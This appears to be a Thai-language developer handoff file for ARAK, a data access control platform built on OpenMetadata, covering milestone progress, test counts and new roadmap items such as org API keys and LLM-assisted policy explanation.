# HANDOFF — ARAK (Data Access Control Platform)

> อัปเดต: 2026-09-25 · commit ล่าสุดที่ push สำเร็จ `0029375` · **local นำหน้าอยู่หลาย commit — `git push` ยังค้าง ดู What Didn't Work** · repo https://github.com/sakanarm/ARAK (**public**)
>
> อ่านคู่กับ **[docs/DESIGN.md](docs/DESIGN.md)** — ไฟล์นั้นคือ requirement + feature catalogue + สถานะครบทุกข้อ
> ไฟล์นี้บอกเฉพาะ "ทำถึงไหน จะไปต่อยังไง อะไรที่ลองแล้วไม่เวิร์ค"
>
> **[docs/policy-conflict-resolution.md](docs/policy-conflict-resolution.md)** — กติกาการชนกันของ policy ฉบับอธิบายผู้ใช้ (ภาษาไทย + ตัวอย่าง 6 เคส) ผู้ใช้ขอไว้สำหรับเอาไปอธิบายทีม · ฝั่ง spec อยู่ที่ [docs/policy-spec.md](docs/policy-spec.md)

---

## Goal

สร้างแพลตฟอร์ม Data Access Control แบบ Immuta/Denodo: ดึง metadata + governance object จาก **OpenMetadata 2.0.1** (integrate เฉยๆ **ไม่สร้าง catalog ใหม่**) → เขียน policy (subscription + data policy, global + local, RBAC/ABAC/rule/time เป็น predicate เดียว) → **บังคับใช้จริงที่ database** ครบ 3 โหมดใน Phase 1:

- **5.1.1** native source config (RLS / DDM / GRANT บน object เดิม)
- **5.1.2** secure view `*_secure` + REVOKE base table
- **5.2a** Query API ที่ rewrite SQL ตอน runtime

Phase 1 รองรับ SQL Server + PostgreSQL · identity หลักคือ Entra ID (local user ไว้เทสต์) · access-request workflow เลื่อน Phase 2
แผนเต็มอยู่ที่ `C:\Users\Sakan P\.claude\plans\requirement-access-optimized-dahl.md` (approved แล้ว)

---

## Current Progress

| Milestone | สถานะ |
|---|---|
| **M0 Foundation** | ✅ เสร็จ — Maven multi-module, Dropwizard 5, Vite+React+Tailwind shell, vendor `ui-core-components`, JSON Schema → Java/TS codegen, OM client จาก swagger ที่ pin ไว้, Flyway V1–V10, docker-compose, CI 4 jobs |
| **M1 OM Connector** | 🚧 ~95% — full crawl + governance + effective facet + FR-1.5 webhook/poller/reconcile + catalog read API + Catalog UI + governance read API + Governance UI · **sync กับ OM จริงสำเร็จแล้ว** · เหลือ FR-1.6 (reconcile กับ JDBC จริง), FR-1.7 (local tag + push-back — **ผู้ใช้สั่ง read-only ตอนนี้**) |
| **M2 Identity** | 🚧 ~50% — local sign-in ใช้ได้ · schema `principal`/`principal_attribute`/`group_member`/`app_role_assignment` มีตั้งแต่ V2 · read API + หน้า People & attributes (**filter ตาม attribute + กดเข้าไปดูสมาชิกใน group ได้ที่ `/principals/:id`**) + **หน้า Application roles (`/settings/roles`) อ่านอย่างเดียว** เสร็จ · **เพิ่ม local account + assign/withdraw app role ได้จาก UI แล้ว (V10 + `IdentityAdminStore` + audit)** · **ยังไม่มี write API สำหรับ *attribute* — ต้อง seed ด้วย SQL** · ยังไม่มีหน้าจอเปลี่ยน password (ทุก account ที่สร้างเป็น `must_change`) · ยังไม่มี Entra OIDC / Graph sync |
| **M3 Policy Engine** | 🚧 ~97% — engine **277 tests** (+10 รอบนี้ — `DataPolicyCompositionTest.MaskConflicts` ที่ทำให้เจอบั๊กการให้เครดิต policy ดูข้อ AH.3) (+101 รอบนี้ — `PolicyAlgebraTest` 34 ที่ assert **เซตของคนที่ผ่าน** ไม่ใช่ทีละคน + `ExpressionReferenceTest` ที่รันทุก example ในหน้า doc ผ่าน evaluator จริง) · เดิม **166 tests** (+10 รอบนี้ · **เจอบั๊กจริงสองตัวที่ grant โดนเต็มๆ ดูข้อ AE.1/AE.2**) (data policy 26 + subscription 45 เพิ่มรอบนี้ · เจอบั๊กจริง 2 ตัว ดูข้อ P) · persistence (`PolicyStore`) + `policy_binding` materializer + REST · `PolicyBindingMaterializerIT` 10 tests บน Postgres จริง · **decision cache (FR-5.5) ปิดแล้วรอบนี้ — 25 tests ดูข้อ AB** · เหลือ ANTLR grammar ของ `expr` (FR-3.2) ข้อเดียว |
| **M4 Policy Authoring UI** | ✅ **เสร็จ** — Policy list + Policy builder + readback + capability matrix + `/policies/:id` หน้าสรุปอ่านอย่างเดียว + panel Policies ในหน้า asset (FR-3.1.5) + View-as-user (FR-5.2, ข้อ Z) · **รอบนี้ปิดข้อสุดท้าย: impact analysis (FR-5.3) — `GET /v1/policies/{id}/impact` + panel “Who it changes things for” ดูข้อ AA** · **รอบนี้เพิ่มหน้า `/docs/expressions` — syntax reference ที่ backend ส่งมาจาก jar ของ engine กดจากช่อง expression ได้ พร้อม 11 policy ตัวอย่างจริงใน DB (ข้อ AF.3/AF.4)** |
| **M5 Secure View (5.1.2)** | 🚧 ~85% — **slice 1 จบ: `ViewCompiler` + golden-file test 2 dialect ดูข้อ AK.1** · **slice 2 จบ: `RowEntitlementMaintainer` (17 tests) — pure ทั้งคลาส · **refuse ไม่ใช่ skip** เมื่อ treatment/entitlement key ไม่ตรงกับ view ที่ติดตั้งอยู่ · ⚠️ **ไม่ต้องมี migration** (ตาราง `acl.*` อยู่ที่ source) — ดูข้อ AT** · `DecisionSql` + dialect ใช้ร่วมกับ 5.2 เหมือนเดิม · **slice 3 ครึ่งแรกจบ: `SecureViewApplier` — dry-run / apply / rollback ใน transaction เดียว · `StaleReviewException` เมื่อแถวเปลี่ยนหลังคนอนุมัติ · **11 tests บน Postgres จริง = ครั้งแรกที่ secure view ของ ARAK รันบนฐานข้อมูล** — ดูข้อ AU** · **slice 3 ครึ่งหลังจบรอบนี้: `SecureViewService` + `EnforcementResource` (`/api/v1/enforcement/secure-views` dry-run / apply / rollback) + V20 (`audit_enforcement` + ชื่อ view ที่ apply) + หน้า `/enforcement` + เมนูกลับมาแล้ว · apply ส่งแค่ `reviewId` · ทดสอบสดครบวงบน Postgres dev — ดูข้อ AW** · เหลือ slice 4 (MSSQL Testcontainers) · credential แยกสำหรับ DDL · cutover (FR-6.1.1) · `DbPrincipalProvisioner` |
| **M6 Push Config (5.1.1)** | ⏸️ **ON HOLD — ผู้ใช้สั่ง 2026-09-24 *"M6 Push Config (5.1.1) Hold ไว้ก่อน"*** · ห้ามเริ่มจนกว่าผู้ใช้จะปลด · scope ที่ตกลงไว้ยังเหมือนเดิม: opt-in ต่อ source · ยิงเฉพาะ **policy object ที่แยกจาก table** (PG `CREATE POLICY` · MSSQL `CREATE SECURITY POLICY` · column GRANT) · **ตัด MSSQL DDM ออก** เพราะมัน `ALTER COLUMN` ทับนิยาม table — ดูข้อ AC.1 และ DESIGN FR-6.2a |
| **M7 Query API (5.2a)** | 🚧 ~80% — **`POST /v1/query` + Query console ใช้งานได้จริงรอบนี้** · rewrite → RLS + mask + hidden column → execute → audit ครบ · พิสูจน์กับ Postgres จริงแล้วทั้ง allow / RLS / mask / refuse · เหลือ direct-access detector (FR-6.3.1) และ result cache |
| **M7b Cross-mode consistency** | ⬜ — ต้องมี M5/M6 ก่อน |
| **M8 Audit + Ops** | 🚧 ~35% — **FR-7 ปิดครบวงรอบนี้ (grant ตรงระดับ table + auto-revoke + audit trail + หน้าจอ) ดูข้อ AD.1** · `audit_query` / `audit_decision` / `audit_policy_change` เขียนจริงแล้วและอ่านได้ · **`evaluation_ms` มีค่าแล้ว (ข้อ AE.5)** · **ยังไม่มี audit ของการ configure** (เปลี่ยน data source / OM settings ไม่ถูกบันทึกที่ไหนเลย) · ยังไม่มี compliance report / drift detector / auto-revoke / SIEM export |
| **M9 Access Request Management** | 🚧 **~35% — slice 1 จบรอบนี้ (ข้อ AX)** · `access_request` (V21) + ขอ / inbox / approve / reject / withdraw + audit · approver = owner จาก OM (ตรงหรือผ่าน team) หรือ platform admin ถ้าไม่มี owner · หน้า `/requests` · **slice 2 ที่ผู้ใช้สั่งแล้ว (ข้อ AX.9):** Approve ≠ ให้สิทธิ์ — แยกเป็น *ตัดสินใจ* แล้ว *Fulfil* ด้วยมือโดย Owner / **Steward / Custodian (จาก Custom Property ใน OM)** + หน้า review ที่มี impact / risk / ข้อมูลผู้ขอ (attribute, group, role, สิทธิ์ที่มีอยู่) / suggestion ว่าต้องไปแก้ policy ไหน-สร้างใหม่ + conflict + ไอคอน Inbox พร้อม badge บน header · ยังไม่ทำ: approval chain หลายขั้น · recertification · break-glass · notification ทาง email/Teams |
| **M10 Access Control Dashboard** | ⬜ **Phase 2 — ออกแบบแล้ว ยังไม่เริ่ม** · หน้าเดียวที่ตอบว่า "ตอนนี้องค์กรคุมข้อมูลได้ดีแค่ไหน" · 4 แถว: **Coverage** (asset ที่มี tag PII แต่ไม่มี policy คุ้มครอง / % ของ asset ที่ enforce แล้ว) · **Exposure** (ใครเข้าถึง PII ได้บ้าง · grant ที่ใกล้หมดอายุ · สิทธิ์ที่ไม่ได้ใช้เกิน 90 วัน) · **Activity** (query ต่อวัน แยก EXECUTED/REJECTED/FAILED · top principal · top asset · เหตุผลที่ถูกปฏิเสธบ่อยที่สุด) · **Health** (enforcement state ต่อ source · drift · รอบ sync ล่าสุด · p95 ของ decision) — **ข้อมูลมีอยู่ครบแล้วทั้งหมด** (`audit_query`, `audit_decision`, `asset_facet`, `policy_binding`, `access_grant`, `enforcement_state`) → งานคือ query + หน้าจอ ไม่ต้อง migrate — ดูแบบเต็มที่ข้อ AM.4 |
| **M11 LLM Assist** | 🚧 **~60%** — ตารางนี้เคยเขียนว่า "ยังไม่เริ่ม" ซึ่งไม่จริงแล้ว · **per-user gateway ใช้งานได้จริง** — แต่ละคนใส่ base URL + key ของตัวเองในหน้า Settings และเลือกเองว่าจะเปิดใช้ไหม (`llm_user_setting.base_url` + `api_key_cipher` Fernet · key ไม่เคยถูกส่งกลับ ตอบแค่ `hasOwnKey`) · `llm_provider.allow_personal` เป็น kill switch · ⚠️ `LlmResource.putUser` ตัดสิทธิ์ admin ให้แก้ได้แค่ `enabled` — **ไม่มีใครเขียน gateway ของคนอื่นได้ ห้ามผ่อน** · ทดสอบสดผ่านแล้ว (21 models + completion ด้วย key ของ `analyst_a` เอง) · เหลือฟีเจอร์จริงสองตัว: **NL→SQL** และ **ร่าง policy** ที่ออกมาเป็น `DRAFT` เท่านั้น (FR-2.6 — LLM ไม่มีสิทธิ์ activate เอง) — ดูข้อ AO.8/AO.9 |
| **M12 Home ที่จัดเอง** | ✅ **เสร็จ — milestone ใหม่ ไม่อยู่ในแผนเดิม** · หน้าแรกจัดวางเองได้ต่อ account · 5 preset · 14 widget type (กราฟวาดเป็น SVG มือ ไม่มี chart library) · วาง **HTML / Note / Link / Video** ได้ · `V13__home_layout.sql` — ไม่มีแถว = default (ลบแถว = reset) · **default คนละใบตาม role**: governance ได้หน้าเดิม · Requestor ได้หน้า Search · ⚠️ **HTML ที่คนพิมพ์เอง = stored XSS** → `HomeLayoutValidator` ล้างทั้ง**ตอนเขียนและตอนอ่าน** **ห้ามมีทางเขียน `home_layout` ที่ไม่ผ่านตัวนี้** · **M12b persona เสร็จแล้ว** (`V19__home_role_layout.sql`) — admin จัดหน้าแรกให้แต่ละ Platform Role ได้ที่ `/settings/home` · resolve แบบ **personal → role (แรงสุดที่ถือ) → built-in** · **persona ไม่เคยทับหน้าที่คนจัดเอง** · ⚠️ เป็น**ที่แรกที่ markup ของคนหนึ่งถูก render ใน session ของอีกคนโดยตั้งใจ** → `@Secured("PLATFORM_ADMIN")` + ล้างผ่าน `HomeLayoutValidator` ทั้งเขียนและอ่าน — ดูข้อ AN และ AS |
| **M13 Request access จากจุดที่โดนปฏิเสธ** | ✅ **เสร็จรอบนี้ (ข้อ AX)** · refusal (403) ของ `POST /v1/query` พก `assetFqn` · `requestable` · `blockedBy` · `approvers[]` · `openRequestId` · หน้า Query ขึ้นกล่อง **"The owner can let you in"** → ฟอร์มขอสิทธิ์ (เหตุผล + จำนวนวัน + purpose + SQL ที่ติด) · ถ้า grant ช่วยไม่ได้ (DENY / ชั้นบนปฏิเสธ) บอกชื่อ policy ที่ขวางแทน ไม่ส่งไปให้ owner · **SQL Suggest** ในหน้า Query พร้อมป้าย *Readable* / *Request needed* ต่อ table · **ปุ่มเดียวกันบนหน้า asset ใน Catalog ✅ (ข้อ AY)** — มุมขวาบนของหัวหน้า asset · เปิด dialog ฟอร์มเดียวกัน · บอก *You can read this* / *Access requested* / กุญแจ + ชื่อ policy ที่ขวาง · ยังไม่ทำ: flag "ปฏิเสธแบบไม่บอกอะไรเลย" ต่อ policy |
| **M14 Public API + Swagger + Org Key** | ⬜ **Roadmap ใหม่ — ผู้ใช้ขอ 2026-09-24** · เปิด ARAK ให้ระบบอื่นเรียกได้: **Swagger UI + OpenAPI spec** ที่ generate จาก resource จริง · **สร้าง policy** และ **query ตามสิทธิ์ที่ตัวเองมี** ผ่าน API ได้ · auth ด้วย **Org Key ที่มีวันหมดอายุบังคับ** — scope ต่อ key, ผูกกับ principal ที่ระบุ, สิทธิ์ของ key ไม่เกินสิทธิ์ของเจ้าของ — ดูข้อ AP.2 |
| **M15 LLM อธิบาย policy และอธิบาย dashboard** | ⬜ **Roadmap ใหม่ — ผู้ใช้ขอ 2026-09-24** · ต่อยอดจาก M11 ที่ per-user gateway ใช้ได้จริงแล้ว · **(ก)** admin เปิด policy ตัวหนึ่งแล้วกด "อธิบายให้ฟัง" — LLM แปล selector + subject rule + row filter + mask ออกมาเป็นภาษาคน พร้อมบอกว่า **จะถูก policy ชั้นบนทับตรงไหน** · **(ข)** หน้า Dashboard (M10) กดที่กราฟแล้วให้ LLM อ่านตัวเลขให้ฟังว่ามันแปลว่าอะไรและควรไปดูอะไรต่อ — ⚠️ **ส่ง metadata + ตัวเลขสรุปเท่านั้น ห้ามส่งแถวข้อมูลจริง และ LLM ยังไม่มีสิทธิ์ activate อะไรทั้งสิ้น** (FR-2.6) — ดูข้อ AP.3 |
| **M16 LLM ช่วยหา asset จากสิ่งที่อยากได้** | ⬜ **Roadmap ใหม่ — ผู้ใช้ขอ 2026-09-24** · ในหน้า Query เพิ่ม option ให้พิมพ์เป็นภาษาคนว่า *“อยากได้ข้อมูลผลิตภัณฑ์และราคา”* แล้ว LLM ไปค้นใน metadata (asset + column + description + tag + glossary term + domain) แล้วตอบกลับเป็น **ตาราง/คอลัมน์ที่น่าจะใช่ พร้อมเหตุผลว่าทำไม** · แต่ละตัวต้องบอกด้วยว่า **คุณ query ได้เลย** หรือ **ต้องไปขอสิทธิ์ก่อน** (ต่อปุ่มของ M13 ตรงนั้น) · ตัวที่ query ได้กดแล้วเติม SQL ร่างลงช่อง editor ให้เลย — ⚠️ **ค้นบน metadata เท่านั้น ห้ามส่งแถวข้อมูลจริงให้ LLM** และผลลัพธ์ต้อง **กรองด้วยสิทธิ์ของคนที่ถาม** ก่อนแสดง (ห้ามใช้ LLM เป็นช่องทางส่องว่ามีตารางอะไรอยู่บ้าง) — ดูข้อ AP.4 |
| **M17 ประวัติย้อนหลังของ policy** | ⬜ **Roadmap ใหม่ — ผู้ใช้ขอ 2026-09-24** · ชิป *`v13 · active`* ที่เห็นบนหน้า policy มาจาก `policy.version` + `policy.lifecycle_state` · **ประวัติเก็บครบอยู่แล้วใน `policy_version`** (append-only ตั้งแต่ V3 — `PolicyStore` เขียนทุกครั้งก่อนแก้แถวจริง เก็บ `document` ทั้งใบ + `lifecycle_state` + `changed_by` + `change_reason` + `changed_at`) และ `GET /v1/policies/{id}/versions` ก็เปิดอยู่ **แต่ไม่มีหน้าจอไหนเรียกมันเลย** (`fetchPolicyVersions` ใน `api/policies.ts` เขียนไว้แล้วแต่ไม่มีใครใช้) · งานคือ: **แท็บ History** บนหน้า policy · **diff ระหว่างสองเวอร์ชัน** · **rollback** (เขียนเวอร์ชันใหม่ทับ ไม่ใช่ลบของเก่า ตาม FR-9.2) · และ **`audit_policy_change` ที่ยังไม่มีใครเขียนลงไปเลยสักแถว** — ดูข้อ AP.5 |
| **M18 รองรับ database type ใหม่ได้โดยไม่ต้องไล่แก้ 14 จุด** | 🚧 **~75% — slice 1 จบรอบนี้และ*ผ่านการรันจริง*แล้ว (ดูข้อ AR)** · `SourceEngine` registry + `SqlDialects` + `ProxyCapabilities` + `V18__source_engine.sql` + `GET /v1/sources/engines` · **switch ทั้ง 3 ตัวและ hardcode ฝั่ง frontend ทั้ง 6 ไฟล์หายไปแล้ว** · **proxy fail-closed แล้ว** — engine ที่ mask ไม่ได้ถูกปฏิเสธพร้อมบอกทางออก แทนที่จะคืน column แบบ plaintext · เหลือ: introspection quirk ต่อ engine (`supportsSchemas` ยังไม่มีใครอ่าน) · `engine_capability` ฝั่ง native ยังไม่มีคนอ่าน (รอ M6) · และ **เพิ่ม engine ตัวที่ 3 จริงเพื่อพิสูจน์ว่า class เดียวพอ** · เดิมคือ ⬜ **Roadmap ใหม่ — ผู้ใช้ขอ 2026-09-24** · ของที่แพงออกแบบถูกแล้ว (`PolicyDecision` ไม่มี SQL · `SqlDialect` เป็น interface · `engine_capability` เป็น data) **แต่ชื่อ engine ถูก hardcode อยู่ 14 ที่** — `CHECK (engine IN (...))` 2 migration · switch ใน `JdbcTargets` + `SourceProbe` + `QueryService.dialectFor()` · frontend อีก 6 ไฟล์ · ลืมจุดเดียว**ไม่ error ตอน compile** แต่พังตอน runtime · งานคือ **`SourceEngine` registry ตัวเดียว** ที่ถือ url template + driver + dialect + probe + introspection quirk แล้วให้ทุกจุดอ่านจากมัน → เพิ่ม engine = **class 1 ตัว + capability rows** — ดูข้อ AP.7 |

**ที่รันอยู่ตอนนี้**
| | |
|---|---|
| Backend (Dropwizard) | `:8080` (API อยู่ใต้ `/api`), admin `:8081/ping` |
| Frontend (Vite dev) | `http://localhost:3000/` |
| **รูปแบบ prod (jar เสิร์ฟ `dist` + nginx path prefix)** | `http://localhost:8090/Arak/` — ตัวที่ใช้ demo |
| App DB (docker `dac-appdb`, postgres:16-alpine) | `:5432` db/user `dac` |
| OpenMetadata ของทีม | `2.0.1` — sync ผ่าน **ingestion-bot JWT** (ดู What Didn't Work) |

เทสต์ทั้งหมดเขียว — **backend unit + integration รันครบเมื่อ 2026-09-25 → `./mvnw -o verify -Pintegration` BUILD SUCCESS · unit 696 · Failures 0 Errors 0** (รอบ AY: +1 `SpaServletTest.unusualCharacters` · integration **214** (รอบ AZ: +5 `AccessRequestIT.Notices`) — **+23 จาก `AccessRequestIT`** ขอ / อนุมัติ / ปฏิเสธ / ถอน + เคส policy ชนกัน (DENY · ชั้นบนปฏิเสธ · override · approve ไม่ปลด mask) บน Postgres จริง), frontend `npx jest` + `npx tsc --noEmit` + `vite build` รันใหม่ **2026-09-25** (**35 suites / 302 tests** เขียว — ดูข้อ AZ.5, AY.5 และ AX.8 · tsc exit 0 · build 11.78s · `scripts/check-cursor-pointer.mjs` → *every &lt;button&gt; offers a hand*)

> ⚠️ **`backend/dac-service/target/surefire-reports/com.mfec.dac.catalog.AssetStoreIT.txt` ยังแดงค้างอยู่ในโฟลเดอร์ — เป็นไฟล์เก่าจาก 2026-09-23 20:35 ก่อน commit `19b0503` ซึ่งคือ commit ที่แก้เคสนั้นพอดี** อย่าอ่านรายงานใน `target/` โดยไม่ดูเวลาไฟล์ — `mvn test` ไม่ล้างรายงานของคลาสที่รอบนี้ไม่ได้รัน

| ชุด | จำนวน | คำสั่ง |
|---|---|---|
| Backend unit | dac-common 31 · dac-engine 277 · **dac-compiler-sql 51 (+17 — `RowEntitlementMaintainerTest`)** · dac-connector-openmetadata 91 · **dac-connector-source 25 (+6 — `SecureViewApplierTest`)** · dac-proxy 30 · **dac-service 186 (+6 — `ReviewedPlansTest`)** = **696** (dac-service **191** — +4 `AccessEligibilityTest` · +1 `SpaServletTest.unusualCharacters` ข้อ AY) | `./mvnw -o test` |
| Backend integration (Testcontainers `postgres:16-alpine`) | **214 tests** — **`AccessRequestIT` 28 (+5 `Notices` ข้อ AZ.5 · 23 ข้อ AX.8)** · `AssetStoreIT` 7 · `CatalogQueryIT` 18 · `DataSourceStoreIT` 13 · `GovernanceStoreIT` 10 · `GrantCompositionIT` 17 · **`HomeLayoutStoreIT` 14 (+8 รอบนี้ — persona)** · `IdentityAdminStoreIT` 24 · `ImpactAnalysisIT` 8 · `PolicyBindingMaterializerIT` 10 · `PolicyOverviewIT` 24 · `PolicyStoreIT` 10 · **`SecureViewApplierIT` 11 (ใหม่รอบนี้ — อยู่ใน `dac-connector-source` ไม่ใช่ `dac-service`)** · **`SecureViewServiceIT` 15 (ใหม่รอบนี้)** · `SourceEngineRegistryIT` 5 | `./mvnw verify -Pintegration` (ทั้ง reactor) |
| Frontend | **35 suites / 302 tests** (รอบ AZ: `AccessRequestsPage.test.tsx` 22 (+9) · `RequestNotices.test.tsx` ใหม่ 10 — ดูข้อ AZ.5 · รอบ AY: +10 `AriaRouter.test.tsx` · `AssetRequestAccess.test.tsx` 9 · +4 `AssetDetailPage.test.tsx` — ดูข้อ AY.5 · รอบ AX: +20 `SqlEditor.test.tsx` · +16 `RequestAccess.test.tsx` · +13 `AccessRequestsPage.test.tsx` · +5 `accessRequests.test.ts` · `sqlCompletion.test.ts` — ดูข้อ AX.8 · ก่อนหน้า: +7 `EnforcementPage.test.tsx` — dry run → apply ส่งแค่ reviewId · non-admin ไม่มีปุ่ม Apply / Roll back · apply ที่ถูกปฏิเสธล้าง review · rollback ต้องยืนยัน · +9 `policyFlow.test.ts` — ลำดับด่าน · selector ว่าง = 0 asset ไม่ใช่ทุก asset · subject ว่าง = `open` ไม่ใช่ `set` · "ไม่ผ่านด่าน" ต้องไม่อ่านว่า deny · +3 `PolicyFlowChart.test.tsx` — ไม่ส่ง `onEdit` ต้องไม่มีปุ่มใดๆ · ก่อนหน้านี้ +4 ใน `HomePersonasPage.test.tsx` — หน้าที่คนหนึ่งจัดหน้าจอให้อีกคน: admin เท่านั้นที่เห็น · ครบทั้ง 5 role ไม่ว่าจะตั้งไว้หรือยัง · ประโยค "starting point ไม่ใช่ override" · เซฟแล้วต้องลง role ที่เปิดอยู่เท่านั้น) | `npx jest` ใน `frontend/app` |

`yarn type-check` · `yarn lint` · `yarn build` ผ่านหมด → **BUILD SUCCESS** ทั้งสองฝั่ง

---

## Roadmap ที่เพิ่มรอบนี้ — **M13 · M14 · M15 · M16 · M17 · M18** (ผู้ใช้ขอ 2026-09-24)

ผู้ใช้สั่งว่า *"ช่วยเพิ่ม Roadmap เพิ่ม Access Control ให้เรามีความพิเศษ"* แล้วให้มาสามข้อ
แล้วขอเพิ่มข้อที่สี่ ห้า และหกตามมาในวันเดียวกัน (M16, M17, M18)
ทั้งหกข้อไม่ใช่ของประดับ — แต่ละข้อปิดรูที่ **มีอยู่จริงและวัดได้** ในของที่รันอยู่ตอนนี้

### AP.1 M13 — Request access จากจุดที่โดนปฏิเสธ

**รูที่มีอยู่จริง** — ยิง query จริงเมื่อกี้ได้คำตอบนี้กลับมา:

```
POST /api/v1/query  {"sourceId":"…","sql":"SELECT * FROM sales.customer"}
→ "Access to demo-pg.salesdb.sales.customer is denied.
   finance-subscription did not apply: outside the policy's permitted time window"
```

ข้อความนี้ถูกต้องและอธิบายได้ (FR-5.4 ทำงาน) **แต่มันเป็นทางตัน** — คนอ่านรู้ว่าตัวเองไม่มีสิทธิ์
แล้วต้องไปเดาเองว่าใครเป็นเจ้าของ table นี้ แล้วเดินไปถามใน Teams ซึ่งเป็นขั้นตอนที่หลุดจากระบบทั้งหมด
และ audit ตอบไม่ได้ว่าใครเคยขออะไรไว้บ้าง

**สิ่งที่ต้องทำ**

| ชั้น | งาน |
|---|---|
| Engine | `PolicyDecision` มี `reasons()` อยู่แล้ว — ต้องพา **policy id + scope level** ที่ปฏิเสธติดมาถึง response ไม่ใช่แค่ string |
| API | refusal body เพิ่ม `assetFqn`, `deniedBy[]`, `approvers[]` (resolve จาก `asset_owner` ที่ crawl มาแล้ว) และ `requestable: true\|false` |
| UI | หน้า Query: กล่อง refusal ขึ้นปุ่ม **"ขอสิทธิ์กับเจ้าของ"** → เปิดฟอร์มที่กรอก asset / policy ที่ติด / SQL ที่พยายามรัน / ช่องเหตุผล + purpose + duration ไว้ให้แล้ว |
| หน้า Catalog | ปุ่มเดียวกันบนหน้า asset สำหรับคนที่ยังไม่ได้ลองยิง query |

⚠️ **ขึ้นกับ M9** — ปลายทางของปุ่มคือ `access_request` ที่ M9 จะสร้าง ทางเตรียมไว้หมดแล้ว
(`grant.source` = `manual` \| `request` + `request_id` nullable ตั้งแต่ V11 · `asset_owner` พร้อม route)
→ **ทำ M13 พร้อม M9 เป็นชิ้นเดียวกัน** อย่าทำแยก ไม่งั้นได้ปุ่มที่กดแล้วไม่มีอะไรรับ

⚠️ **ข้อที่ต้องระวัง** — refusal ที่บอกว่า "ไปขอคนนี้" คือการ**เปิดเผยว่า asset นี้มีอยู่จริง**
ให้คนที่ไม่มีสิทธิ์เห็น ถ้า asset บางตัวเป็นความลับระดับที่ห้ามรู้แม้กระทั่งว่ามันมีอยู่
ต้องมี flag ต่อ policy ว่า **ปฏิเสธแบบไม่บอกอะไรเลย** (ตอนนี้ยังไม่มี)

### AP.2 M14 — Public API + Swagger + Org Key

**รูที่มีอยู่จริง** — ทุก endpoint ของ ARAK auth ด้วย **JWT ที่ได้จาก `POST /v1/auth/login` เท่านั้น**
ซึ่งแปลว่าระบบอื่นจะเรียก ARAK ได้ต้องเอา **password ของคนจริง** ไปฝังไว้ ซึ่งผิดทุกข้อ
และตอนนี้ยัง**ไม่มี OpenAPI spec ของ API เราเอง** (ที่ pin ไว้ใน repo คือ swagger ของ **OpenMetadata** คนละตัวกัน)

**สิ่งที่ต้องทำ**

| ชั้น | งาน |
|---|---|
| Spec | ผูก `dropwizard-swagger` / `swagger-jaxrs2` generate OpenAPI จาก resource จริง + เสิร์ฟ Swagger UI ที่ `/api/openapi` — **generate จากโค้ด ห้ามเขียน spec มือ** ไม่งั้นมันจะไม่ตรงภายในสองสัปดาห์ |
| Migration | `org_api_key` — `id` · `label` · `key_hash` · `principal_id` FK · `scopes text[]` · `expires_at NOT NULL` · `created_by` · `last_used_at` · `revoked_at` |
| Auth filter | `X-ARAK-Key` → hash → lookup → เช็ค `expires_at` → ผูกเป็น `AuthenticatedUser` ตัวเดิม |
| Scope | อย่างน้อย `policy:read` · `policy:write` · `query:run` · `catalog:read` |
| UI | หน้า Settings ออก key ได้ + โชว์ key **ครั้งเดียวตอนสร้าง** + ตารางบอกว่าแต่ละใบหมดอายุเมื่อไหร่/ใช้ล่าสุดเมื่อไหร่ + ปุ่ม revoke |

⚠️ **กติกาที่ห้ามถอด**
1. **เก็บเป็น hash เท่านั้น** (Argon2id หรือ SHA-256 + salt) — DB ที่หลุดต้องไม่แปลว่า key หลุด
2. **`expires_at` เป็น NOT NULL** ตามที่ผู้ใช้สั่ง — ห้ามมี key ที่ไม่มีวันตาย
3. **key ไม่เพิ่มสิทธิ์ให้ใคร** — สิทธิ์ที่แท้จริง = `scopes ∩ สิทธิ์ของ principal เจ้าของ key`
   key ของ Requester สร้าง policy ไม่ได้ ต่อให้ขอ scope `policy:write` มา
4. **query ผ่าน key ต้องวิ่งผ่าน `QueryService` ตัวเดิม** — policy เดิม, audit เดิม, cap เดิม
   ห้ามมีทางลัดที่ข้าม PolicyEngine เด็ดขาด
5. **ทุกการใช้ key ลง `audit_query` / `audit_decision` พร้อมบอกว่ามาทาง key ใบไหน**

### AP.3 M15 — LLM อธิบาย policy และอธิบาย dashboard

**รูที่มีอยู่จริง** — หน้า `/policies/:id` ตอนนี้แสดง selector, subject rule, row filter, mask
ได้ครบและถูกต้อง แต่มันแสดงเป็น **โครงสร้าง** ไม่ใช่ **คำอธิบาย** — คนที่ไม่ได้เขียน policy ตัวนั้นเอง
ต้องนั่งประกอบในหัวว่าเจ็ดชั้นรวมกันแล้วแปลว่าอะไร ซึ่งเป็นสิ่งที่ FR-5.1 บอกเองว่า
**คนทำไม่ได้อย่างน่าเชื่อถือ**

**(ก) อธิบาย policy** — ปุ่มในหน้า `/policies/:id` และในหน้า asset
ส่งให้ LLM: policy JSON + ชั้นที่มันอยู่ + policy ชั้นอื่นที่ match asset เดียวกัน + capability matrix
ได้กลับมา: ย่อหน้าภาษาคนว่า *ใครเห็นอะไร ไม่เห็นอะไร เพราะอะไร* + **คำเตือนว่าข้อไหนจะถูกชั้นบนทับ**

**(ข) อธิบาย dashboard** — ปุ่มบนแต่ละกราฟใน M10
ส่งให้ LLM: **ตัวเลขสรุปของกราฟนั้น** + นิยามของ metric
ได้กลับมา: มันแปลว่าอะไร ผิดปกติตรงไหน ควรไปดู asset/principal ตัวไหนต่อ

⚠️ **กติกาที่ห้ามถอด (ต่อจาก FR-2.6 และของเดิมใน `AssistPrompts`)**
1. **ส่ง metadata และตัวเลขสรุปเท่านั้น ห้ามส่งแถวข้อมูลจริงแม้แต่แถวเดียว** — บังคับด้วยโครงสร้าง
   เหมือนที่ `AssistPromptsTest.carriesNoValues` ทำอยู่ ไม่ใช่ด้วยการเตือนใน prompt
2. **LLM ไม่มี write path** — อธิบายได้อย่างเดียว activate/แก้ policy ไม่ได้
3. **คำอธิบายไม่ใช่คำตัดสิน** — หน้าจอต้องเขียนกำกับว่านี่คือคำอธิบายที่ LLM สร้าง
   ของจริงคือ **simulator (FR-5.2)** ที่คำนวณจาก engine จริง ห้ามให้คนเข้าใจสลับกัน
4. **ยังเป็น per-user gateway** — ใช้ key ของคนที่กด ไม่ใช่ key กลาง (ตามที่ผู้ใช้สั่งไว้ที่ AO.8)
   ใครไม่ได้ตั้ง gateway ไว้ ปุ่มนี้ไม่ขึ้น และ**ทุกอย่างอื่นในหน้าต้องใช้ได้ตามปกติ**

### AP.4 M16 — LLM ช่วยหา asset จากสิ่งที่อยากได้

> `ทำ option ใน Query ให้สามารถใช้ LLM ช่วยค้นหา Asset ตามที่ user อยากได้`
